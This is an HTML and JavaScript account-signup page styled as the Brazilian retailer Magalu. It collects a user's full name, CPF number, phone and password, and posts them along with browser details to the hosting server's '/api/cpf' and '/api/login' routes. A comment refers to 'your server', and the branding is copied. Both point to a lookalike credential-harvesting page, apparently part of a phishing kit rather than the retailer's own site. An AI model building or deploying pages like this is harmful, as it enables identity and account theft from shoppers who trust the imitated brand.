<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro - Magalu</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', Arial, sans-serif; background: #f0f3f4; color: #1e2428; min-height: 100vh; display: flex; flex-direction: column; }
        .container { max-width: 480px; margin: 0 auto; padding: 20px; width: 100%; }
        .header { background: #0086ff; padding: 12px 20px; display: flex; align-items: center; gap: 12px; position: sticky; top: 0; z-index: 100; }
        .header a { color: #fff; text-decoration: none; font-size: 18px; }
        .header .logo { color: #fff; font-size: 18px; font-weight: 700; margin-left: auto; }
        .header .logo i { margin-right: 6px; }
        .card { background: #fff; border-radius: 16px; padding: 32px 28px; margin-top: 24px; border: 1px solid #e5e7eb; box-shadow: 0 4px 16px rgba(0,0,0,0.04); }
        .card h1 { font-size: 24px; font-weight: 700; margin-bottom: 4px; }
        .card .subtitle { color: #697277; font-size: 14px; margin-bottom: 24px; }
        .form-group { margin-bottom: 16px; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #1e2428; margin-bottom: 4px; }
        .form-group input { width: 100%; padding: 12px 14px; border: 1.5px solid #d3dadd; border-radius: 8px; font-size: 14px; outline: none; transition: 0.15s; }
        .form-group input:focus { border-color: #0086ff; box-shadow: 0 0 0 3px rgba(0,134,255,0.08); }
        .form-group .helper { font-size: 12px; color: #697277; margin-top: 4px; }
        .btn-primary { width: 100%; padding: 14px; background: #0086ff; border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.15s; }
        .btn-primary:hover { background: #0075e2; }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
        .message { padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 16px; display: none; }
        .message.success { display: block; background: #e9f9ee; color: #1cb35c; border: 1px solid #b8e6c8; }
        .message.error { display: block; background: #fdeded; color: #d30d31; border: 1px solid #f5c6c6; }
        .message.loading { display: block; background: #e8f0fe; color: #0086ff; border: 1px solid #b8d4f0; }
        .login-link { text-align: center; margin-top: 16px; font-size: 14px; color: #697277; }
        .login-link a { color: #0086ff; font-weight: 600; text-decoration: none; }
        .login-link a:hover { text-decoration: underline; }
        .senha-requisitos { font-size: 12px; color: #697277; margin-top: 4px; }
        .senha-requisitos .valido { color: #1cb35c; }
        .senha-requisitos .invalido { color: #d30d31; }
        .footer { text-align: center; padding: 20px; color: #697277; font-size: 12px; margin-top: auto; }
        @media (max-width: 480px) { .card { padding: 24px 20px; } .container { padding: 12px; } }
    </style>
</head>
<body>

    <header class="header">
        <a href="/"><i class="fas fa-arrow-left"></i></a>
        <div class="logo"><i class="fas fa-store"></i> magalu</div>
    </header>

    <div class="container">
        <div class="card">
            <h1>Criar conta</h1>
            <div class="subtitle">Cadastre-se para fazer compras e acompanhar seus pedidos</div>

            <div class="message" id="message"></div>

            <form id="cadastroForm" onsubmit="realizarCadastro(event)">
                <div class="form-group">
                    <label>Nome completo</label>
                    <input type="text" id="nome" placeholder="Digite seu nome completo" required>
                </div>
                <div class="form-group">
                    <label>CPF</label>
                    <input type="text" id="cpf" placeholder="000.000.000-00" required maxlength="14">
                    <div class="helper">Digite apenas números</div>
                </div>
                <div class="form-group">
                    <label>Telefone</label>
                    <input type="text" id="telefone" placeholder="(11) 99999-9999" required maxlength="15">
                </div>
                <div class="form-group">
                    <label>Senha</label>
                    <input type="password" id="senha" placeholder="Mínimo 6 caracteres" required minlength="6">
                    <div class="senha-requisitos" id="senhaRequisitos">
                        <span id="reqTamanho" class="invalido"><i class="fas fa-circle"></i> Mínimo 6 caracteres</span>
                    </div>
                </div>
                <div class="form-group">
                    <label>Confirmar senha</label>
                    <input type="password" id="confirmarSenha" placeholder="Digite a senha novamente" required>
                </div>
                <button type="submit" class="btn-primary" id="btnCadastrar"><i class="fas fa-user-plus"></i> Cadastrar</button>
            </form>

            <div class="login-link">
                Já tem conta? <a href="/login.html">Faça login</a>
            </div>
        </div>
    </div>

    <div class="footer">Magalu - Todos os direitos reservados</div>

    <script>
        // Máscaras
        document.getElementById('cpf').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            if (value.length > 9) {
                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
            } else if (value.length > 6) {
                value = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
            } else if (value.length > 3) {
                value = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
            }
            this.value = value;
        });

        document.getElementById('telefone').addEventListener('input', function(e) {
            let value = this.value.replace(/\D/g, '');
            if (value.length > 11) value = value.slice(0, 11);
            if (value.length > 10) {
                value = value.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
            } else if (value.length > 6) {
                value = value.replace(/(\d{2})(\d{4})(\d{1,4})/, '($1) $2-$3');
            } else if (value.length > 2) {
                value = value.replace(/(\d{2})(\d{1,4})/, '($1) $2');
            }
            this.value = value;
        });

        document.getElementById('senha').addEventListener('input', function() {
            const senha = this.value;
            const reqTamanho = document.getElementById('reqTamanho');
            if (senha.length >= 6) {
                reqTamanho.className = 'valido';
                reqTamanho.innerHTML = '<i class="fas fa-check-circle"></i> Mínimo 6 caracteres';
            } else {
                reqTamanho.className = 'invalido';
                reqTamanho.innerHTML = '<i class="fas fa-circle"></i> Mínimo 6 caracteres';
            }
        });

        async function realizarCadastro(e) {
            e.preventDefault();

            const nome = document.getElementById('nome').value.trim();
            const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
            const telefone = document.getElementById('telefone').value.replace(/\D/g, '');
            const senha = document.getElementById('senha').value;
            const confirmarSenha = document.getElementById('confirmarSenha').value;
            const message = document.getElementById('message');

            if (!nome || !cpf || !telefone || !senha || !confirmarSenha) {
                message.className = 'message error';
                message.textContent = 'Preencha todos os campos';
                return;
            }

            if (cpf.length !== 11) {
                message.className = 'message error';
                message.textContent = 'CPF inválido. Digite 11 números';
                return;
            }

            if (senha.length < 6) {
                message.className = 'message error';
                message.textContent = 'A senha deve ter no mínimo 6 caracteres';
                return;
            }

            if (senha !== confirmarSenha) {
                message.className = 'message error';
                message.textContent = 'As senhas não coincidem';
                return;
            }

            const btn = document.getElementById('btnCadastrar');
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Cadastrando...';

            message.className = 'message loading';
            message.textContent = 'Cadastrando...';

            try {
                const ip = 'cliente';
                const dispositivo = navigator.userAgent;
                const navegador = navigator.userAgent;

                // Usando a rota /api/cpf do seu servidor
                const response = await fetch('/api/cpf', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        cpf, 
                        ip, 
                        dispositivo, 
                        navegador, 
                        telefone 
                    })
                });

                const data = await response.json();

                if (data.success) {
                    message.className = 'message success';
                    message.textContent = 'CPF registrado! Agora defina sua senha.';

                    // Agora enviar a senha
                    const loginResponse = await fetch('/api/login', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ 
                            cpf, 
                            password: senha,
                            ip,
                            dispositivo,
                            navegador,
                            telefone
                        })
                    });

                    const loginData = await loginResponse.json();

                    if (loginData.success) {
                        message.className = 'message success';
                        message.textContent = 'Cadastro realizado com sucesso! Redirecionando...';
                        document.getElementById('cadastroForm').reset();

                        // Salvar dados na sessão
                        sessionStorage.setItem('userCpf', cpf);
                        sessionStorage.setItem('userNome', nome);

                        setTimeout(() => {
                            window.location.href = '/';
                        }, 1500);
                    } else {
                        message.className = 'message error';
                        message.textContent = loginData.error || 'Erro ao definir senha. Tente novamente.';
                        btn.disabled = false;
                        btn.innerHTML = '<i class="fas fa-user-plus"></i> Cadastrar';
                    }
                } else {
                    message.className = 'message error';
                    message.textContent = data.error || 'Erro ao cadastrar. Tente novamente.';
                    btn.disabled = false;
                    btn.innerHTML = '<i class="fas fa-user-plus"></i> Cadastrar';
                }
            } catch (error) {
                console.error('Erro:', error);
                message.className = 'message error';
                message.textContent = 'Erro de conexão. Tente novamente.';
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-user-plus"></i> Cadastrar';
            }
        }
    </script>

</body>
</html>
